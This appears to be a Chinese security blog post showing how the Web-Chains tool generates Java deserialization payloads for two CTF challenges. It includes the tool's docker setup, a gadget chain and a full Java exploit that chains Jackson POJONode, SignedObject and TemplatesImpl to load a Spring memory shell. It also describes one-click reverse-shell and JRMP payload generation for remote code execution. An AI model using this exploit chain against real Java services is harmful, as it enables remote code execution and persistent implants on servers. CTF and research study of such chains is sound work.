#  [随手分享]Web-Chains在Java赛题中的利用   
原创 DatouYoo  大头SEC   2025-02-08 05:20  
  
## 项目地址  
  
地址如下：  
- https://github.com/Java-Chains/web-chains  
  
安装命令：  
```
docker run -d \  --name web-chains \  --restart=always \  -p 8011:8011 \  -p 58080:58080 \  -p 50389:50389 \  -p 50388:50388 \  -p 13999:13999 \  -p 3308:3308 \  -p 11527:11527 \  -p 50000:50000 \  -e CHAINS_AUTH=true \  -e CHAINS_PASS= \  javachains/webchains:1.3.0
```  
  
查看登录密码：  
```
docker logs $(docker ps | grep javachains/webchains | awk '{print $1}') | grep -E 'password'
```  
  
浏览器访问8011端口登录后台：  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6icsibVwIpj8icY6lVxqOOoicuMBhibWTVpu75x9vwfDVw8muEkUAA5LfVYxNDUKK7S3B2diazmuLFGtKJRkg/640?wx_fmt=png&from=appmsg "")  
  
image.png  
## 案例介绍  
### 一键生成原生序列化数据  
> 以“2023浙江大学生省赛初赛 secObj”为例  
  
  
原调用链如下：  
```
HashMap#readObject-> HashMap#putVal-> HotSwappableTargetSource#equals-> XString#equals -> POJONode#toString-> SignedObject#getObject -> BadAttributeValueExpException#readObject-> BaseJsonNode#toString-> TemplatesImpl#getOutputProperties
```  
  
原EXP如下（近100行）：  
```
import com.fasterxml.jackson.databind.node.POJONode;import com.sun.org.apache.bcel.internal.Repository;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xpath.internal.objects.XString;import javassist.ClassPool;import javassist.CtClass;import javassist.CtMethod;import org.springframework.aop.framework.AdvisedSupport;import org.springframework.aop.target.HotSwappableTargetSource;import javax.management.BadAttributeValueExpException;import javax.xml.transform.Templates;import java.io.ByteArrayOutputStream;import java.io.ObjectOutputStream;import java.lang.reflect.*;import java.security.*;import java.util.Base64;import java.util.HashMap;publicclass SignedObjectBAVEPoC {    public static void main(String[] args) throws Exception {        // 删除 BaseJsonNode#writeReplace 方法        ClassPool pool = ClassPool.getDefault();        CtClass ctClass0 = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");        CtMethod writeReplace = ctClass0.getDeclaredMethod("writeReplace");        ctClass0.removeMethod(writeReplace);        ctClass0.toClass();        // 比赛时不出网，打Spring内存马        byte[] bytes = Repository.lookupClass(SpringMemShell.class).getBytes();        Templates templatesImpl = new TemplatesImpl();        setFieldValue(templatesImpl, "_bytecodes", newbyte[][]{bytes});        setFieldValue(templatesImpl, "_name", "aaaa");        setFieldValue(templatesImpl, "_tfactory", null);        // 内层 BadAttributeValueExpException#readObject -> BaseJsonNode#toString        POJONode po1= new POJONode(makeTemplatesImplAopProxy(templatesImpl));        BadAttributeValueExpException ba1= new BadAttributeValueExpException(1);        setFieldValue(ba1,"val",po1);        KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance("DSA");        keyPairGenerator.initialize(1024);        KeyPair keyPair = keyPairGenerator.genKeyPair();        PrivateKey privateKey = keyPair.getPrivate();        Signature signingEngine = Signature.getInstance("DSA");        SignedObject signedObject = new SignedObject( ba1, privateKey, signingEngine);        POJONode jsonNodes = new POJONode(1);        setFieldValue(jsonNodes,"_value",signedObject);        HotSwappableTargetSource hotSwappableTargetSource1 = new HotSwappableTargetSource(jsonNodes);        HotSwappableTargetSource hotSwappableTargetSource2 = new HotSwappableTargetSource(new XString("1"));        HashMap hashMap = makeMap(hotSwappableTargetSource1, hotSwappableTargetSource2);        ByteArrayOutputStream barr = new ByteArrayOutputStream();        ObjectOutputStream objectOutputStream = new ObjectOutputStream(barr);        objectOutputStream.writeObject(hashMap);        objectOutputStream.close();        String res = Base64.getEncoder().encodeToString(barr.toByteArray());        System.out.println(res);    }    // 解决 jackson 链不稳定性问题（当然，如果运气好，不用它也行）    public static Object makeTemplatesImplAopProxy(Templates templates) throws Exception {        AdvisedSupport advisedSupport = new AdvisedSupport();        advisedSupport.setTarget(templates);        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);        constructor.setAccessible(true);        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);        return proxy;    }    private static void setFieldValue(Object obj, String field, Object arg) throws Exception{        Field f = obj.getClass().getDeclaredField(field);        f.setAccessible(true);        f.set(obj, arg);    }    public static HashMap<Object, Object> makeMap (Object v1, Object v2 ) throws Exception {        HashMap<Object, Object> s = new HashMap<>();        setFieldValue(s, "size", 2);        Class<?> nodeC;        try {            nodeC = Class.forName("java.util.HashMap$Node");        }        catch ( ClassNotFoundException e ) {            nodeC = Class.forName("java.util.HashMap$Entry");        }        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);        nodeCons.setAccessible(true);        Object tbl = Array.newInstance(nodeC, 2);        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));        setFieldValue(s, "table", tbl);        return s;    }}
```  
  
通过Web-Chains工具生成仅需“点点点几下-输入反弹shell的IP端口”即可生成：  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6icsibVwIpj8icY6lVxqOOoicuMBhS8BS8alvx6w2nozAqhKANbf4AkZyaklNnJiaCWunf1MSq7pGsuNjiaHQ/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
一键RCE，免去了手动写EXP的过程（当然，分析还是需要的）  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6icsibVwIpj8icY6lVxqOOoicuMBhlhzVwJ9ib6j70GbNCCeichRGiatteXokGhNkUJP61mwKCgWL08VUmpgsA/640?wx_fmt=png&from=appmsg "")  
  
image.png  
### 一键生成JRMP需要的反序列化数据  
> 以“2022年网鼎杯 ezjava”赛题为例  
  
  
如果遇到JRMP需要自定义反序列化数据（如fastjson链），需要“在ysoserial新增fastjson链-打包-上传到vps”等等操作  
  
而在Web-Chains中仅需“绑定JRMPListener所需的链子-生成JRMPClient数据”即可  
  
下图将fastjson链绑定至JRMPListener中  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6icsibVwIpj8icY6lVxqOOoicuMBhxWrOZRakkeiaLwRflElBLUujR3djKWFW7vHuFkkBia9xVtbnfZCQQDsg/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
生成JRMPClient数据  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6icsibVwIpj8icY6lVxqOOoicuMBh1YMiaqcVfLD7kdic2S4MA3eDZeJjBaZdho8SGIavBGD8FpOq6JJPo0RA/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
发送EXP实现RCE  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6icsibVwIpj8icY6lVxqOOoicuMBhxTbKW2eiaUyOADFL7cjGticG2gEK23T3mgbQX0VXbzdnbOThNt3zClHw/640?wx_fmt=png&from=appmsg "")  
  
image.png  
### 其他  
  
还有很多可以通过Web-Chains一键RCE的赛题，这里就简单介绍这两种~  
  
  
